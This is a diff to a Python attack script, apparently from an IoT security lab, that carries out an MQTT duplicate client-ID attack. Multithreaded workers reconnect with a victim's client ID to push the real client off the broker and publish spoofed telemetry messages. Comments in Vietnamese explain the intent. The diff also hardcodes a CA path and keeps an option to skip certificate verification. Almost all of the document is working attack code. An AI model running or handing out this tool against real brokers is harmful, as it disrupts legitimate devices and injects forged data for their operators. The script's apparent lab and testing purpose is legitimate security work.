@@ -4,20 +4,13 @@ import json, time, threading, random, argparse, ssl, os
 from datetime import datetime, timezone
 
 class DuplicateIDAttackTLS:
-    def __init__(self, broker_host="localhost", broker_port=8884,
-                 ca_certs=None, client_cert=None, client_key=None,
-                 insecure=False, use_tls: bool | None = None):
+    def __init__(self, broker_host="localhost", broker_port=8883,
+                 ca_certs="certs/ca-cert.pem", insecure=False, use_tls=True):
         self.broker_host = broker_host
         self.broker_port = broker_port
         self.ca_certs = ca_certs
-        self.client_cert = client_cert
-        self.client_key = client_key
         self.insecure = insecure
-
-        if use_tls is None:
-            self.use_tls = True if broker_port in (8883, 8884) else False
-        else:
-            self.use_tls = bool(use_tls)
+        self.use_tls = use_tls
 
         self.attack_stats = {
             "duplicate_attempts": 0,
@@ -36,9 +29,8 @@ class DuplicateIDAttackTLS:
         if not self.use_tls:
             print("=" * 60)
             return
-        print(f"  Using CA file: {self.ca_certs or 'None'} -> {'FOUND' if (self.ca_certs and os.path.exists(self.ca_certs)) else 'MISSING or using system CA'}")
-        print(f"  Client cert: {self.client_cert or 'None'} -> {'FOUND' if (self.client_cert and os.path.exists(self.client_cert)) else 'MISSING'}")
-        print(f"  Client key : {self.client_key or 'None'} -> {'FOUND' if (self.client_key and os.path.exists(self.client_key)) else 'MISSING'}")
+        
+        print(f"  Using CA file (Hardcoded/Default): {self.ca_certs} -> {'FOUND' if (self.ca_certs and os.path.exists(self.ca_certs)) else 'MISSING'}")
         print(f"  Insecure mode (skip verification): {self.insecure}")
         print("=" * 60)
 
@@ -47,6 +39,7 @@ class DuplicateIDAttackTLS:
             try:
                 client = mqtt.Client(client_id=client_id, protocol=mqtt.MQTTv311)
             except Exception:
+             
                 api = getattr(mqtt, "CallbackAPIVersion", None)
                 if api is not None:
                     v1 = getattr(api, "V1", getattr(api, "VERSION1", None))
@@ -59,22 +52,17 @@ class DuplicateIDAttackTLS:
                     client.username_pw_set(username, password)
                 return client
 
+            
             if self.ca_certs and os.path.exists(self.ca_certs):
                 client.tls_set(
                     ca_certs=self.ca_certs,
-                    certfile=self.client_cert if (self.client_cert and os.path.exists(self.client_cert)) else None,
-                    keyfile=self.client_key if (self.client_key and os.path.exists(self.client_key)) else None,
                     cert_reqs=ssl.CERT_REQUIRED,
                     tls_version=ssl.PROTOCOL_TLS_CLIENT,
                     ciphers=None
                 )
             else:
+                
                 ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
-                if self.client_cert and self.client_key and os.path.exists(self.client_cert) and os.path.exists(self.client_key):
-                    try:
-                        ctx.load_cert_chain(certfile=self.client_cert, keyfile=self.client_key)
-                    except Exception as e:
-                        print(f"  Warning: failed to load client cert/key: {e}")
                 if self.insecure:
                     ctx.check_hostname = False
                     ctx.verify_mode = ssl.CERT_NONE
@@ -108,6 +96,7 @@ class DuplicateIDAttackTLS:
                     if rc == 0:
                         self.attack_stats["connections_successful"] += 1
                         print(f" Worker {worker_id}: attempt {attempt+1} connected OK ({proto})")
+                        # Gửi một vài tin nhắn giả mạo để tăng tính chân thực
                         for i in range(3):
                             payload = {
                                 "timestamp": datetime.now(timezone.utc).isoformat(),
@@ -134,6 +123,7 @@ class DuplicateIDAttackTLS:
                 def on_disconnect(c, u, rc):
                     self.attack_stats["disconnections"] += 1
                     if rc != 0:
+                        # In ra nếu bị ngắt kết nối bất ngờ (thường là do client thật kết nối lại)
                         print(f" Worker {worker_id}: unexpected disconnect rc={rc}")
 
                 client.on_connect = on_connect
@@ -141,7 +131,10 @@ class DuplicateIDAttackTLS:
                 client.connect(self.broker_host, self.broker_port, 60)
                 client.loop_start()
                 self.attack_stats["duplicate_attempts"] += 1
+                
+                # Giữ kết nối một chút để đẩy client cũ ra
                 time.sleep(2)
+                
                 client.loop_stop()
                 client.disconnect()
                 time.sleep(delay_ms / 1000.0)
@@ -174,7 +167,10 @@ class DuplicateIDAttackTLS:
                 client.connect(self.broker_host, self.broker_port, 60)
                 client.loop_start()
                 self.attack_stats["duplicate_attempts"] += 1
+                
+                # Kết nối rất ngắn để tạo xung đột liên tục
                 time.sleep(0.1)
+                
                 client.loop_stop()
                 client.disconnect()
             except Exception as e:
@@ -220,7 +216,7 @@ class DuplicateIDAttackTLS:
             print(f"Duration: 0.00s | Attempts/s: 0.00")
 
 def main():
-    p = argparse.ArgumentParser(description="MQTT Duplicate Client-ID Attack (TLS-aware)")
+    p = argparse.ArgumentParser(description="MQTT Duplicate Client-ID Attack (TLS-aware - CA Hardcoded)")
     p.add_argument("--broker", default="localhost")
     p.add_argument("--port", type=int, default=8884)
     p.add_argument("--workers", type=int, default=3)
@@ -233,15 +229,15 @@ def main():
                    help="Attack type: sequential or simultaneous")
     p.add_argument("--duration", type=int, default=30, help="Duration for simultaneous attack (s)")
 
-    p.add_argument("--ca", help="Path to CA certificate file (PEM) to validate broker certificate")
-    p.add_argument("--client-cert", help="Path to client certificate (PEM) for mutual TLS")
-    p.add_argument("--client-key", help="Path to client private key (PEM) for mutual TLS")
+   
+    p.add_argument("--ca", default="certs/ca-cert.pem", help="Path to CA certificate file (Default: certs/ca-cert.pem)")
     p.add_argument("--insecure", action="store_true", help="Skip TLS certificate validation (testing only)")
     p.add_argument("--no-tls", action="store_true", help="Force plain TCP (no TLS)")
     p.add_argument("--tls", action="store_true", help="Force TLS even on default plaintext ports")
 
     args = p.parse_args()
 
+  
     if args.no_tls:
         use_tls = False
     elif args.tls:
@@ -253,8 +249,6 @@ def main():
         broker_host=args.broker,
         broker_port=args.port,
         ca_certs=args.ca,
-        client_cert=args.client_cert,
-        client_key=args.client_key,
         insecure=args.insecure,
         use_tls=use_tls
     )
